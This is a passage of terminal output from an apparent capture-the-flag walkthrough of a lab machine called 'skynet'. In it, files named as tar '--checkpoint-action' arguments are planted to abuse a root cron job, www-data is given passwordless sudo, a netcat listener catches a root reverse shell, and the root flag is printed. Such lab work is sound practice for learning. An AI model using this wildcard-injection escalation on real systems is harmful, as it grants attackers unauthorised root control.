drwxr-xr-x 2 www-data www-data  4096 Sep 17  2019 admin
drwxr-xr-x 3 www-data www-data  4096 Sep 17  2019 ai
drwxr-xr-x 2 www-data www-data  4096 Sep 17  2019 config
drwxr-xr-x 2 www-data www-data  4096 Sep 17  2019 css
-rw-r--r-- 1 www-data www-data 25015 Sep 17  2019 image.png
-rw-r--r-- 1 www-data www-data   523 Sep 17  2019 index.html
drwxr-xr-x 2 www-data www-data  4096 Sep 17  2019 js
-rw-rw-rw- 1 www-data www-data   129 Jun 17 06:19 mksudo.sh
-rw-r--r-- 1 www-data www-data  2667 Sep 17  2019 style.css
-rw-r--r-- 1 root     root         0 Jun 17 06:48 wasrun1
www-data@skynet:/var/www/html$ rm -i ./*
rm: remove regular empty file './--checkpoint-action=exec=sh mksudo.sh'? y
rm: remove regular empty file './--checkpoint=1'? ^C
www-data@skynet:/var/www/html$ ls -la
total 72
-rw-rw-rw- 1 www-data www-data     0 Jun 17 06:08 --checkpoint=1
drwxr-xr-x 8 www-data www-data  4096 Jun 17 06:49 .
drwxr-xr-x 3 root     root      4096 Sep 17  2019 ..
drwxr-xr-x 3 www-data www-data  4096 Sep 17  2019 45kra24zxs28v3yd
drwxr-xr-x 2 www-data www-data  4096 Sep 17  2019 admin
drwxr-xr-x 3 www-data www-data  4096 Sep 17  2019 ai
drwxr-xr-x 2 www-data www-data  4096 Sep 17  2019 config
drwxr-xr-x 2 www-data www-data  4096 Sep 17  2019 css
-rw-r--r-- 1 www-data www-data 25015 Sep 17  2019 image.png
-rw-r--r-- 1 www-data www-data   523 Sep 17  2019 index.html
drwxr-xr-x 2 www-data www-data  4096 Sep 17  2019 js
-rw-rw-rw- 1 www-data www-data   129 Jun 17 06:19 mksudo.sh
-rw-r--r-- 1 www-data www-data  2667 Sep 17  2019 style.css
-rw-r--r-- 1 root     root         0 Jun 17 06:49 wasrun1
www-data@skynet:/var/www/html$ touch ./'--checkpoint-action=exec=sh mksudo.sh'
www-data@skynet:/var/www/html$ ls -la
total 72
-rw-rw-rw- 1 www-data www-data     0 Jun 17 07:00 --checkpoint-action=exec=sh mksudo.sh
-rw-rw-rw- 1 www-data www-data     0 Jun 17 06:08 --checkpoint=1
drwxr-xr-x 8 www-data www-data  4096 Jun 17 07:00 .
drwxr-xr-x 3 root     root      4096 Sep 17  2019 ..
drwxr-xr-x 3 www-data www-data  4096 Sep 17  2019 45kra24zxs28v3yd
drwxr-xr-x 2 www-data www-data  4096 Sep 17  2019 admin
drwxr-xr-x 3 www-data www-data  4096 Sep 17  2019 ai
drwxr-xr-x 2 www-data www-data  4096 Sep 17  2019 config
drwxr-xr-x 2 www-data www-data  4096 Sep 17  2019 css
-rw-r--r-- 1 www-data www-data 25015 Sep 17  2019 image.png
-rw-r--r-- 1 www-data www-data   523 Sep 17  2019 index.html
drwxr-xr-x 2 www-data www-data  4096 Sep 17  2019 js
-rw-rw-rw- 1 www-data www-data   129 Jun 17 06:19 mksudo.sh
-rw-r--r-- 1 www-data www-data  2667 Sep 17  2019 style.css
-rw-r--r-- 1 root     root         0 Jun 17 07:04 wasrun1
www-data@skynet:/var/www/html$ chmod +x mksudo.sh 
www-data@skynet:/var/www/html$ ls -la
total 72
-rw-rw-rw- 1 www-data www-data     0 Jun 17 07:00 --checkpoint-action=exec=sh mksudo.sh
-rw-rw-rw- 1 www-data www-data     0 Jun 17 06:08 --checkpoint=1
drwxr-xr-x 8 www-data www-data  4096 Jun 17 07:00 .
drwxr-xr-x 3 root     root      4096 Sep 17  2019 ..
drwxr-xr-x 3 www-data www-data  4096 Sep 17  2019 45kra24zxs28v3yd
drwxr-xr-x 2 www-data www-data  4096 Sep 17  2019 admin
drwxr-xr-x 3 www-data www-data  4096 Sep 17  2019 ai
drwxr-xr-x 2 www-data www-data  4096 Sep 17  2019 config
drwxr-xr-x 2 www-data www-data  4096 Sep 17  2019 css
-rw-r--r-- 1 www-data www-data 25015 Sep 17  2019 image.png
-rw-r--r-- 1 www-data www-data   523 Sep 17  2019 index.html
drwxr-xr-x 2 www-data www-data  4096 Sep 17  2019 js
-rwxrwxrwx 1 www-data www-data   129 Jun 17 06:19 mksudo.sh
-rw-r--r-- 1 www-data www-data  2667 Sep 17  2019 style.css
-rw-r--r-- 1 root     root         0 Jun 17 07:04 wasrun1
www-data@skynet:/var/www/html$ sudo cat /etc/sudoers
www-data ALL=(root) NOPASSWD: ALL
www-data@skynet:/var/www/html$ sudo -l
User www-data may run the following commands on skynet:
    (root) NOPASSWD: ALL
www-data@skynet:/var/www/html$ sudo su -
root@skynet:~# exit
logout
www-data@skynet:/var/www/html$ sudo su -
root@skynet:~# 
Session terminated, terminating shell...logout
 ...terminated.
www-data@skynet:/var/www/html$  
```

root
```sh
┌──(kali㉿kali)-[~/shells]
└─$ nc -lvnp 444
listening on [any] 444 ...
connect to [10.18.21.236] from (UNKNOWN) [10.10.28.220] 38420
bash: cannot set terminal process group (7632): Inappropriate ioctl for device
bash: no job control in this shell
root@skynet:/var/www/html# cd ~
cd ~
root@skynet:~# ls -la
ls -la
total 28
drwx------  4 root root 4096 Sep 17  2019 .
drwxr-xr-x 23 root root 4096 Sep 18  2019 ..
lrwxrwxrwx  1 root root    9 Sep 17  2019 .bash_history -> /dev/null
-rw-r--r--  1 root root 3106 Oct 22  2015 .bashrc
drwx------  2 root root 4096 Sep 17  2019 .cache
drwxr-xr-x  2 root root 4096 Sep 17  2019 .nano
-rw-r--r--  1 root root  148 Aug 17  2015 .profile
-rw-r--r--  1 root root   33 Sep 17  2019 root.txt
root@skynet:~# cat root.txt
cat root.txt
3f0372db24753accc7179a282cd6a949
root@skynet:~# ^C

```
